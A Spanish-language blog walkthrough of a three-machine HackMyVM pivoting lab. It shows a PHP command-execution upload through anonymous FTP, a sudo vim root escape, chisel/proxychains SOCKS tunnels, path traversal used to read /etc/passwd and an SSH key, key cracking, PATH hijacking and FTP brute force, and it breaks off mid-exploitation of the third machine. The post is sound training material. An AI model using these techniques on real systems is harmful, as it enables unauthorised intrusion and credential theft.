---
layout      : post
title       : "Laboratorio de PIVOTING - HackMyVM Friendly"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_labpivoting_banner.png
category    : [ article, hmv ]
tags        : [ setenv, sudo, pivoting, ecppt, lfi, race-condition, bruteforce ]
---
3 entornos, jugaremos principalmente con pivoting, pero a su vez, con accesos indebidos a servicios curiosos, permisos algo peligrosos como otros usuarios, fuerza bruta pa romper varias cositas, carreritas contra procesos, lectura de archivos internos, jmmm, varios temitas pa saltar.

## TL;DR (Spanish writeup)

**Máquinas creadas por**: [RiJaba1](https://hackmyvm.eu/profile/?user=RiJaba1).

Muchas gracias a **RiJaba1** por sus máquinas y aporte a la comunidad, abrazitos (:

Vamos a crear un laboratorio de pivoting, fin.

😝

Aproveche la ocasión y usé la serie de entornos que creo **RiJaba1**, tanto para practicar y como para intentar enseñarles sobre de **Pivoting** y como lidear con él (cero lidia), es muy divertido y fácil de realizar, solo es como todo, práctica.

Vamos a romper 3 máquinas, como atacantes tendremos conexión con una de ellas, ella y solo ella tendrá conexión internamente con otra y esta otra tendrá también internamente un intercambio de información con una nueva. Es más fácil de entender gráficamente, más abajo encontrarás el **alcance** que seguiremos.

¡Metámosle candela a esta cadena!

> La idea inicial de esta locura es tener mis "notas" por si algun día se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) 😄 La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo la oportunidad de ayudarlos ¿por qué no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva más de enseñanza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

Cadena pa mi bici.

1. [Alcance](#lab-alcance).
1. [Creación de laboratorio](#lab-creacion).
1. [Friendly1](#lab-friendly1).
  * [Reconocimiento](#friendly1-reconocimiento).
  * [Enumeración](#friendly1-enumeracion).
  * [Explotación](#friendly1-explotacion).
  * [Escalada de privilegios](#friendly1-escalada-de-privilegios).
  * [Post Explotación](#friendly1-post-explotacion).
  * [Pivoting F1 < F2](#friendly12-pivoting).
2. [Friendly2](#lab-friendly2).
  * [Reconocimiento](#friendly2-reconocimiento).
  * [Enumeración](#friendly2-enumeracion).
  * [Explotación](#friendly2-explotacion).
  * [Escalada de privilegios](#friendly2-escalada-de-privilegios).
  * [Post Explotación](#friendly2-post-explotacion).
  * [Pivoting F1 < F2 < F3](#friendly123-pivoting).
3. [Friendly3](#lab-friendly3).
  * [Reconocimiento](#friendly3-reconocimiento).
  * [Enumeración](#friendly3-enumeracion).
  * [Explotación](#friendly3-explotacion).
  * [Escalada de privilegios](#friendly3-escalada-de-privilegios).

...

# Ruta de baile [#](#lab-alcance) {#lab-alcance}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1y2y3_google_diagram_f1ANDf2ANDf3.png" style="width: 100%;"/>

# Creación de laboratorio [#](#lab-creacion) {#lab-creacion}

Para ello necesitamos primero descargar las máquinas (claramente :P):

| Nombre | Plataforma | Creada por |
| ------ | ---------- | ---------- |
| [Friendly1](https://hackmyvm.eu/machines/machine.php?vm=Friendly1) | HackMyVM | [RiJaba1](https://hackmyvm.eu/profile/?user=RiJaba1) |
| [Friendly2](https://hackmyvm.eu/machines/machine.php?vm=Friendly2) | HackMyVM | [RiJaba1](https://hackmyvm.eu/profile/?user=RiJaba1) |
| [Friendly3](https://hackmyvm.eu/machines/machine.php?vm=Friendly3) | HackMyVM | [RiJaba1](https://hackmyvm.eu/profile/?user=RiJaba1) |

Ahora, mediante **VirtualBox** (en mi caso, pero los pasos son los mismos, solo cambian los botones) vamos a agregar las máquinas, generar todas las interfaces y enlaces.

Para agregar las máquinas es sencillo, al terminar la descarga se nos genera un comprimido, lo descomprimimos, damos doble clic sobre el archivo y nos debería abrir **VirtualBox** para importar la máquina, seguimos los pasos y tamos. Realizas lo mismo para las otras.

## Creación de interfaces NAT [📌](#lab-virtualbox-interfaces) {#lab-virtualbox-interfaces}

Vamos a `Archivo` > `Herramientas` > `Network Manager` (o indicando **CTRL^H**) > `Nat Networks`.

Ahí, vamos a crear el número de redes que queramos y con el rango y disposición necesaria, yo cree la red `1` con el direccionamiento `192.168.20.0/24` de la siguiente forma, los pasos son iguales para todas las redes:

* Clic en `Crear`
* Nombre: `1n`
* IPv4 Prefix: `192.168.20.0/24`
* Activamos `Enable DHCP` para que asigne IP automáticamente una vez la máquina sea iniciada.

Si repetimos los pasos con los siguientes datos:

* `2n` : `172.18.100.0/24`
* `3n` : `192.168.40.0/24`

Deberíamos tener algo así:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_labcreation_virtualbox_natNetworksCreated.png" style="width: 80%;"/>

Tamos, por aquí no tenemos que mover nada más. Ahora vamos a asignar esos rangos a las máquinas.

## Asignación de IPs a máquinas [📌](#lab-virtualbox-distribute-interfaces) {#lab-virtualbox-distribute-interfaces}

Nuestro entorno debe quedar distribuido de la siguiente forma (las IPs internas de cada cuadrado son dinámicas, así que esas no nos interesan en este punto, solo los que están al lado del logo de Linux):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1y2y3_google_diagram_f1ANDf2ANDf3.png" style="width: 100%;"/>

Empezamos configurando nuestro entorno, nuestra máquina, nuestro home, nuestra casita, como sea que la llames (:

Clic derecho sobre la máquina > `Configuración` > `Red` y listo, configuramos para que nos quede así:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_labcreation_virtualbox_assignIPs_interface1.png" style="width: 60%;"/>

Ahora configuramos una de las máquinas con dos interfaces, es muy sencillo, hacemos el mismo proceso de arriba para una interfaz, y para la otra solo debemos dar clic en el apartado `Adaptador 2` y activar `Enable Network Adapter`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_labcreation_virtualbox_assignIPs_interface2.png" style="width: 60%;"/>

Repetirías estos pasos para las demás máquinas, dejándolo todo como el diagrama.

...

A JUGAAAAAAAAAAR!

---

<h1 id="lab-friendly1" style="text-align: center;"><span style="color: green;">- Friendly1 (F1) -</span></h1>

---
---

# Reconocimiento (F1) [#](#friendly1-reconocimiento) {#friendly1-reconocimiento}

Como atacantes no conocemos realmente nada aún, sabemos que hay un host aparte de nosotros en la red `192.168.20.0/24`, pero no estamos conscientes de su dirección IP, así que vamos a buscarla.

Usaré `arp-scan`:

```bash
arp-scan -l
...
192.168.20.28   08:00:27:a2:9f:c0       PCS Systemtechnik GmbH
```

De todas, la única distinta y no conocida es la `192.168.20.28`, así que nos quedamos con ella.

Empezamos viendo qué puertos (servicios) tiene activos la máquina, para ello emplearé `nmap`:

```bash
nmap -p- --open -v 192.168.20.28 -oA TCP_initScan_Friendly1
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535 puertos |
| --open    | Devuelve solo los puertos que estén abiertos |
| -v        | Permite ver en consola lo que va encontrando |
| -oA       | Guarda el output en distintos formatos, para luego aprovechar el formato grepeable y usar la [función **extractPorts**](https://pastebin.com/raw/X6b56TQ8) de [S4vitar](https://s4vitar.github.io/) que me extrae y copia los puertos en la clipboard |

El escaneo nos muestra:

| Puerto | Descripción |
| ------ | :---------- |
| 21     | **[FTP](https://www.xataka.com/basics/ftp-que-como-funciona)**: Servicio para transferir/compartir archivos. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Podemos gestionar servicios web. |

**_____(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, en este caso no es necesario (ya que tenemos pocos puertos), pero si tuviéramos varios puertos evitamos tener que escribirlos uno a uno**
 
```bash
extractPorts TCP_initScan_Friendly1.gnmap 
```

```txt
[*] Extracting information...

    [*] IP Address: 192.168.20.28
    [*] Open ports: 21,80

[*] Ports copied to clipboard
```

**)_____**

Ya teniendo los puertos, podemos apoyarnos de nuevo con `nmap` para extraer más info. Validaremos posibles vulnerabilidades que **nmap** encuentre con una lista de scripts propios y además extraeremos la versión del software usado en cada servicio:

```bash
nmap -sCV -p 21,80 192.168.20.28 -oA TCP_portScan_Friendly1
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |

Se nos revelan algunas cositas:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 21     | FTP      | ProFTPD |

Pero también nos informa que tenemos acceso al servicio como el usuario y contraseña [anonymous](https://www.techtarget.com/whatis/definition/anonymous-FTP-File-Transfer-Protocol), esto es interesante, ya lo revisamos...

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP     | Apache httpd 2.4.54 ((Debian)) |

Nada más, así que empecemos a encadenar pasos (:

# Enumeración (F1) [#](#friendly1-enumeracion) {#friendly1-enumeracion}

Normalmente, iniciamos con **HTTP**, pero al tener el usuario `anonymous` habilitado, pues nos vamos primero a jugar con **FTP**.

## Puerto 21 (F1) [📌](#friendly1-puerto-21) {#friendly1-puerto-21}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1_bash_ftp_anonymousAccess.png" style="width: 100%;"/>

Encontramos un archivo llamado `index.html`. Si lo descargamos y vemos su contenido, es el mismo resultado que encontramos al hacer una petición contra el sitio web... ¿Quizás estemos en la raíz que usa el servidor web? ¿Tendremos permisos de escritura?

```bash
echo "hola" > si.txt
```

Validamos y efectivamente tenemos permisos de escritura:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1_bash_ftp_writePermissions_hola.png" style="width: 80%;"/>

Y si buscamos ese archivo en el sitio web:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1_page80_ftpFileUploaded_hola.png" style="width: 80%;"/>

Peeeerfecto (: ¿Notas el punto de explotación?

Sip, vamos a subir un archivo malicioso que nos permita ejecutar comandos en el sistema :O

# Explotación (F1) [#](#friendly1-explotacion) {#friendly1-explotacion}

Procedemos inicialmente a validar si **PHP** es aceptado, usamos la función `exec()` de **PHP** para ello (una de tantas funciones que nos pueden ayudar):

```bash
echo '<?php echo exec("id"); ?>' > buenosdias.php
```

```bash
ftp> put buenosdias.php 
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1_page80_ftpFileUploaded_RCEid.png" style="width: 100%;"/>

LIIIIIISTOS, tenemos ejecución remota de comandos como el usuario `www-data` (: Les dejo de tarea el cómo entablar una **Shell** dentro del sistema para trabajar mucho más cómodos.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1_bash_nc_wwwdataRevSH.png" style="width: 100%;"/>

# Escalada de privilegios (F1) [#](#friendly1-escalada-de-privilegios) {#friendly1-escalada-de-privilegios}

Ya en el sistema, el usuario `www-data` tiene permiso para ejecutar como cualquier usuario el programa `vim` (editor de texto):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1_bash_wwwdataSH_sudoL.png" style="width: 100%;"/>

Apoyados de la web (e incluso de la ayuda propia del programa) encontramos una manera para ejecutar comandos en el sistema:

* [https://gtfobins.github.io/gtfobins/vim/#sudo](https://gtfobins.github.io/gtfobins/vim/#sudo).

Lo único que debemos hacer es pasarle como comando interno a `Vim` seguido de `!` la instrucción a ejecutar, por ejemplo desde la consola ejecutando la **bash** como el usuario **root**:

```bash
sudo -u root /usr/bin/vim -c ':!/bin/bash'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1_bash_rootSH.png" style="width: 100%;"/>

Peeeerfecto! Podríamos decir que ya terminamos la máquina, pero realmente aún no terminamos el laboratorio, acá empieza lo bueno (:

# Post Explotación (F1) [#](#friendly1-post-explotacion) {#friendly1-post-explotacion}

Encontramos inicialmente las flags (**RiJaba1** se quería poner chistoso):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1_flags.png" style="width: 70%;"/>

También algunos posibles usuarios o credenciales (que podemos guardar pensando en las demás máquinas) y mensajes algo crípticos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1_bash_homeRiJaba1_users.png" style="width: 80%;"/>

Y finalmente encontramos una nueva interfaz donde tenemos asignada una IP:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1_bash_ipA_newInterface.png" style="width: 100%;"/>

Así que ojito, esto es muy interesante, ya que quizás también exista otro host en algún otro sitio en la misma red, lo cual nos abre muuuchas posibilidades.

Tenemos asignadas dos IPs de dos segmentos:

* <span style="color: green;">192.168.20.28/24</span>
* <span style="color: orange;">172.18.100.26/24</span>

Veamos si hay más [hosts activos](https://lanzt.gitbook.io/cheatsheet-pentest/in-system/check-privs#internal-hosts-1):

```bash
root@friendly:/home/RiJaba1/things# ./hosts.sh 
IP Activa: 172.18.100.25
IP Activa: 172.18.100.26
IP Activa: 172.18.100.3
IP Activa: 172.18.100.2
IP Activa: 172.18.100.1
```

La `.25` es nuevaaaaaa y tenemos conexión contra ella, por lo que claramente es nuestro siguiente objetivo, intentar explotar/explorar el nuevo descubrimiento.

También podemos ver los [puertos abiertos externamente](https://lanzt.gitbook.io/cheatsheet-pentest/in-system/check-privs#internal-ports):

```bash
root@friendly:/home/RiJaba1/things# ./ports.sh 172.18.100.25
Puerto Abierto: 172.18.100.25:22
Puerto Abierto: 172.18.100.25:80
```

Esta sería nuestra información hasta ahora:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1y2_google_diagram_f1ANDf2.png" style="width: 100%;"/>

Me gusta, procedamos...

# Pivoting F1 < F2 [#](#friendly12-pivoting) {#friendly12-pivoting}

Algo de cátedra :P

> 🦘 Por lo general usamos esta palabra en la post-explotación, o sea despues de haber accedido a un sistema (y posiblemente haberlo comprometido totalmente). El **pivoting** lo podemos pensar como un "trampolin", donde usamos el entorno comprometido como "salto" para llegar (en nuestro caso) a ese nuevo host encontrado. Esto debido a que si intentamos llegar desde nuestra máquina de atacante, no lo lograremos, ¿la razón? la definicion de la interfaz es interna.

Lo que vamos a realizar ahora lo conocemos normalmente como un redireccionamiento de puertos (un port-fortwarding), solo que para hacerlo más dinámico y completo, jugaremos con el tráfico de tooodos los puertos, sin hacerlo uno a uno.

Para ello entablaremos una conexión **SOCKS**, que como bien dice **ChatGPT** :P Funciona como si contratáramos a una personita que nos trajera las cartas que tenemos en un buzón de correo, todas de una. Lo que nos evitaría tener que ir nosotros mismos día a día por las cartas (:

Yo empleo la herramienta [chisel](https://github.com/jpillora/chisel), es muy completa y sencilla de usar, pero también se puede hacer mediante `Metasploit` y demás tools.

> Despues de toda la chachara (menos mal que solo lo explico acá :P), vamos a meterle fuego!!

Descargamos el **chisel** necesario para nuestro sistema operativo y como <span style="color: gray;">atacantes</span> levantamos un servidor que escuche por el puerto `1080`:

```bash
chisel server -p 1080 --reverse
```

Y ahora en <span style="color: green;">F1</span> establecemos la conexión **SOCKS** contra nuestra máquina, generando así un "túnel" que nos permita interactuar con <span style="color: orange;">F2</span> viajando por el puerto `1111` :)

```bash
chisel client 192.168.20.26:1080 R:1111:socks
```

Liiiistones, ya generamos la conexión. Solo que para acceder a los recursos del puerto **SOCKS 127.0.0.1:1111** (o sea, que viaje por el túnel hasta <span style="color: orange;">F2</span>) necesitamos que nuestro entorno entienda como llegar al túnel, para ello usamos [proxychains](https://github.com/haad/proxychains). Modificamos su archivo de configuración (`/etc/proxychains*.conf`)y agregamos en la última línea:

```bash
socks5 127.0.0.1 1111
```

Y listones! Ya podemos ver los servicios (**22** y **80**) desde nuestra máquina de <span style="color: gray;">atacante</span>, usando a <span style="color: green;">F1</span> para llegar a <span style="color: orange;">F2</span>.

> 💡 Recuerda que es como un **"trampolin/túnel/salto/intermediario"** (por eso tambien esta implicado **proxychains**).

Puedes probar con `curl` con `nmap` con `nc` etc. La ejecución es tal que:

```bash
proxychains -q curl http://172.18.100.25
```

Bueno, muy bien, espero me haya hecho entender y haya sido didáctico. Ya teniendo la conexión con <span style="color: orange;">Friendly2 (F2)</span>, explotemos esta vaina...

---

<h1 id="lab-friendly2" style="text-align: center;"><span style="color: orange;">- Friendly2 (F2) -</span></h1>

---
---

# Reconocimiento (F2) [#](#friendly2-reconocimiento) {#friendly2-reconocimiento}

Ya conocemos los puertos abiertos:

```bash
root@friendly:/home/RiJaba1/things# ./ports.sh 172.18.100.25
Puerto Abierto: 172.18.100.25:22
Puerto Abierto: 172.18.100.25:80
```

# Enumeración (F2) [#](#friendly2-enumeracion) {#friendly2-enumeracion}

Veamos el contenido del puerto **80**, pero como estamos jugando con **túneles** necesitamos lo mismo de antes, indicarle al sistema que viaje por ellos. Se puede ver el sitio web (en Firefox en mi caso) de dos formas rápidas:

* Ejecutar `proxychains -q firefox` en la consola.
* Usar la extensión [foxyproxy](https://addons.mozilla.org/es/firefox/addon/foxyproxy-standard/) y agregar el proxy que estamos usando (`socks5://127.0.0.1:1111`).

A mí me gusta más la segunda, así que les dejo los pasos para que los repliquen:

* Instalamos extensión (aunque si usas BurpSuite es probable que ya la tengas).
* Vamos a las opciones de la propia herramienta, específicamente al apartado de **proxies** y añadimos una.
* Título (lo que quieran): **SOCKS 1111**.
* Tipo: **SOCKS5**.
* Hostname: **127.0.0.1**.
* Puerto: **1111**.
* Botón **Save**.
* Damos clic de nuevo en la extensión, activamos **SOCKS 1111** y listo, ya podemos hacer peticiones contra <span style="color: orange;">F2</span>.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly2_page80.png" style="width: 100%;"/>

Un sitio bien diciente.

Realizando exploración de directorios no listados (**fuzzing**) vemos **2** recursos nuevos:

```bash
proxychains -q wfuzz -c -w /opt/seclists/Discovery/Web-Content/raft-large-directories.txt --hh=275 -u http://172.18.100.25/FUZZ
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly2_bash_wfuzz_page80.png" style="width: 100%;"/>

La carpeta **/tools/** nos muestra:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly2_page80tools.png" style="width: 100%;"/>

Nada relevante realmente, pero sí revisamos el código fuente del sitio, añañaiii:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly2_page80tools_sourceCode.png" style="width: 100%;"/>

Un nuevo recurso:

```bash
http://172.18.100.25/tools/check_if_exist.php?doc=keyboard.html
```

Es bien curioso y llamativo... Tenemos un archivo llamado **check_if_exist**, este toma un parámetro **doc** (documento/archivo) y literal toma eso, un nombre de archivo 😈 ¿Qué se te ocurre?

# Explotación (F2) [#](#friendly2-explotacion) {#friendly2-explotacion}

¿Emmmmmm, quizás, solo quizás, nunca se sabe, una vulnerabilidad llamada [**Directory Traversal**](https://portswigger.net/web-security/file-path-traversal)? E incluso peor, un [**Local File Inclusion**](https://keepcoding.io/blog/que-es-local-file-inclusion/)?

> La sencilla definición es: Un **directory traversal** nos permite ver objetos del sistema distintos a los que deberiamos acceder, y un **local file inclusion** lleva esto a otro nivel, ya que permite que el navegador interprete y ejecute el contenido del archivo local, lo que podria llevar a una ejecución de comandos, ¿alarmante? total, ¿critico? depende siempre del alcance. Pero y si en lugar de **local** se conviernte en **remote**??? 🤪

Pueden existir muchos filtros y problemas para hacer funcionar un **Path Traversal**, pero nada, empezamos como siempre con pruebas sencillas.

Probamos inicialmente a salirnos del directorio donde estamos y leer el archivo que contiene información de usuarios del sistema (`/etc/passwd`):

```bash
http://172.18.100.25/tools/check_if_exist.php?doc=../../../../../../etc/passwd
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly2_page80tools_checkIFexistsPHP_etcPasswd.png" style="width: 100%;"/>

EPALEEE! Confirmamos el **Directory Traversaaaaaal** (:

Además, visualizamos el nombre de usuario `gh0st`. Que si sumamos el **Path Traversal** con el directorio **/home/gh0st/**, ¿qué podríamos buscar? [¡Llaves privadas **SSH**](https://wiki.archlinux.org/title/SSH_keys) (además está expuesto el servicio)!!

Recordemos que la llave privada funciona como una contraseña, así que si existe, podríamos entablar una sesión **SSH** sin necesidad de conocer la contraseña del usuario `gh0st`.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly2_page80tools_checkIFexistsPHP_homeGHOSTsshIDRSA.png" style="width: 100%;"/>

Existe 😎, la copiamos en un archivo de nuestro sistema, le damos los permisos necesarios (`chmod 600 archivo`) y ejecutamos:

```bash
proxychains -q ssh gh0st@172.18.100.25 -i gh0st.id_rsa
```

Pero somos informados de que la llave privada está protegida con una "frase" de seguridad:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly2_bash_ssh_tryIDRSAghost_fail.png" style="width: 100%;"/>

No son problemas, jugamos con [ssh2john](https://sniferl4bs.com/2020/07/password-cracking-101-john-the-ripper-password-cracking-ssh-keys/) para obtener un **hash** con el cual intentar fuerza bruta con **John The Ripper**:

```bash
ssh2john gh0st.id_rsa > gh0st.id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt gh0st.id_rsa.hash
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly2_bash_john_GHOSTsshIDRSA_cracked.png" style="width: 100%;"/>

Ejejeeee, listones, reintentamos la conexión con **SSH**, colocamos la clave obtenida y estamos dentro mi gentesita:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly2_bash_ghostSH.png" style="width: 100%;"/>

# Escalada de privilegios (F2) [#](#friendly2-escalada-de-privilegios) {#friendly2-escalada-de-privilegios}

Mi ilustre `gh0st` cuenta con permiso para ejecutar el script `/opt/security.sh` como cualquier usuario del sistema, además, puede indicar una variable de entorno para que esta afecte/interactúe con el programa en cuestión :O

Me gusta, suena comprometedor.

```bash
gh0st@friendly2:~$ cat /opt/security.sh
```

```bash
#!/bin/bash

echo "Enter the string to encode:"
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo "The string cannot be longer than 20 characters."
  exit 1
fi

# Validate that the string does not contain special characters
if echo "$string" | grep -q '[^[:alnum:] ]'; then
  echo "The string cannot contain special characters."
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo "$string" | tr $sus1 $sus2)

echo "Original string: $string"
echo "Encoded string: $encoded_string"
```

Lo primero en lo que pienso es en un **Path Hijacking** (engañar al sistema para que llegue a un programa con nombre conocido, pero con contenido malicioso (en este caso el script usa dos: `grep` y `tr`)), solo que el script va a ir a buscar esos objetos en todos los directorios que están en la variable de entorno `PATH`, pero cada variable es distinta para cada usuario, así que si modificamos la nuestra, solo nos veremos afectados nosotros, más no los otros usuarios...

:O

Tenemos la posibilidad de pasar una variable de entorno al script, así que crearíamos un directorio con los programas maliciosos, lo pondríamos de primero en la lista de directorios del `PATH` y al ejecutar el script con esa variable, llegaría si o si a nuestros programas juguetones!!!

## Path Hijacking (F2) [📌](#friendly2-escalada-pathijacking) {#friendly2-escalada-pathijacking}

Creamos binario `grep` que realmente ejecutaría el comando `id`:

```bash
mkdir ~/things
cd ~/things
echo "id" > grep 
chmod +x grep
```

Y simplemente ejecutamos el script como el usuario `root` (con `sudo`) pasándole la variable `PATH` modificada concatenando el contenido original de ella:

```bash
sudo PATH=/home/gh0st/things:$PATH /opt/security.sh
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly2_bash_ghostSH_pathHijacking_idROOT.png" style="width: 100%;"/>

Y listoooooooo, ejecuta la primera parte de script, luego ejecuta `grep`, pero como tenemos secuestrado el binario, ejecuta realmente el falso `grep`, o sea, `id` (:

Les dejo de tareita obtener una Shell como `root`, es bien sencillo.

# Post Explotación (F2) [#](#friendly2-post-explotacion) {#friendly2-post-explotacion}

La flag está codificada:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly2_bash_rootSH_hidden_flags.png" style="width: 60%;"/>

El script que acabamos de romper está jugando con cadenas y encodeandolas, pues probando con él efectivamente llegamos a la flag, también de tarea.

Enumerando el sistema, igual que antes, encontramos una nueva interfaz asociada a <span style="color: orange;">F2</span>:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly2_bash_ipA_newInterface.png" style="width: 100%;"/>

Realizando los mismos pasos para encontrar hosts, llegamos a una dirección IP distinta, probablemente de <span style="color: blue;">F3</span>:

```bash
bash-5.1# ./hosts.sh 
IP Activa: 192.168.40.20
IP Activa: 192.168.40.21
IP Activa: 192.168.40.3
IP Activa: 192.168.40.2
IP Activa: 192.168.40.1
```

Y tiene distintos puertos abiertos:

```bash
bash-5.1# ./ports.sh 192.168.40.21
Puerto Abierto: 192.168.40.21:21
Puerto Abierto: 192.168.40.21:22
Puerto Abierto: 192.168.40.21:80
```

Así que confirmamos la dirección de <span style="color: blue;">F3</span> y sus puertos (:

Se viene la parte divertida, saltemos entre trampolines 🦘

# Pivoting F1 < F2 < F3 [📌](#friendly123-pivoting) {#friendly123-pivoting}

Ya conocimos la teoría y el paso a paso antes, así que ahora solo te dejaré los pasos (que yo hago) para llegar a todos los objetivos. A <span style="color: green;">**F1**</span>, a <span style="color: orange;">**F2**</span> y a <span style="color: blue;">**F3**</span>:

(Estos ya los tenemos de antes, pero por si algo: <span style="color: gray;">**Atacante**</span> a <span style="color: orange;">**F2**</span>)

* <span style="color: gray;">**Atacante**</span>:
  
  ```bash
  chisel server -p 1080 --reverse
  ```

* <span style="color: green;">**F1**</span>:

  ```bash
  chisel client 192.168.20.26:1080 R:1111:socks
  ```

* <span style="color: gray;">**Atacante**</span>:

  ```bash
  #edit /etc/proxychains file
  socks5 127.0.0.1 1111
  ```

(Nuevos: <span style="color: gray;">**Atacante**</span> a <span style="color: blue;">**F3**</span>)

* <span style="color: green;">**F1**</span>:

  ```bash
  chisel server -p 1081 --reverse
  ```

* <span style="color: orange;">**F2**</span>:

  ```bash
  chisel client 172.18.100.26:1081 R:2222:socks
  ```

* <span style="color: gray;">**Atacante**</span>:

  ```bash
  chisel server -p 1081 --reverse
  ```

* <span style="color: green;">**F1**</span>:

  ```bash
  chisel client 192.168.20.26:1081 R:2222:socks
  ```

* <span style="color: gray;">**Atacante**</span>:

  ```bash
  #edit /etc/proxychains file
  socks5 127.0.0.1 2222
  ```

Y tamos readyyyy, ya podemos hablar todos con todos (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly1y2y3_google_diagram_f1ANDf2ANDf3.png" style="width: 100%;"/>

<h1 id="lab-friendly3" style="text-align: center;"><span style="color: blue;">- Friendly3 (F3) -</span></h1>

---
---

# Reconocimiento (F3) [#](#friendly3-reconocimiento) {#friendly3-reconocimiento}

Ya tenemos los puertos:

```bash
bash-5.1# ./ports.sh 192.168.40.21
Puerto Abierto: 192.168.40.21:21
Puerto Abierto: 192.168.40.21:22
Puerto Abierto: 192.168.40.21:80
```
 
Naveguemos.

# Enumeración (F3) [#](#friendly3-enumeracion) {#friendly3-enumeracion}

Para ver el servidor web, misma historia pero ahora con el puerto `2222`.

> Aunque si te da problemas, puedes usar [proxy.py](https://github.com/abhinavsingh/proxy.py), ejecutarias `proxychains -q proxy`, te generaria un puerto corriendo el http-proxy, tomas ese puerto, agregas un proxy nuevo en **Foxy Proxy**, solo que en lugar de `SOCKS5` colocas `HTTP` y listones (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly3_page80.png" style="width: 60%;"/>

Dos usuarios potenciales:

* sysadmin
* juan

Validando el acceso `anonymous` por **FTP** no logramos entrar, tampoco con posibles vulns para el software usado (`vsftpd 3.0.3`).

# Explotación (F3) [#](#friendly3-explotacion) {#friendly3-explotacion}

Una de las tantas pruebas sería intentar fuerza bruta contra los dos usuarios. Intentando adivinar alguna contraseña.

Sabemos qué **juan** tiene acceso al **FTP** (por el mensaje del sitio web), así que a jugar, usaré [medusa](https://en.kali.tools/?p=200):

```bash
proxychains -q medusa -h 192.168.40.21 -u juan -P /usr/share/wordlists/rockyou.txt -M ftp
```

Con la ilusión de encontrar algo por acá, nos sorprendemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly3_bash_medusa_FTPbruteforceASjuan_done.png" style="width: 100%;"/>

Ujuuuujuii, tenemos unas credenciales válidas contra el servicio **FTP**.

> Ese **juan** sí, como pone esa contraseña, ihssss 🔪

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly3_bash_juanFTPaccess.png" style="width: 60%;"/>

Hay un montón de archivos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly3_bash_juanFTPaccess_dir.png" style="width: 60%;"/>

Aunque no logramos nada por acá. Pero si probamos las mismas credenciales por **SSH**, adivina que...

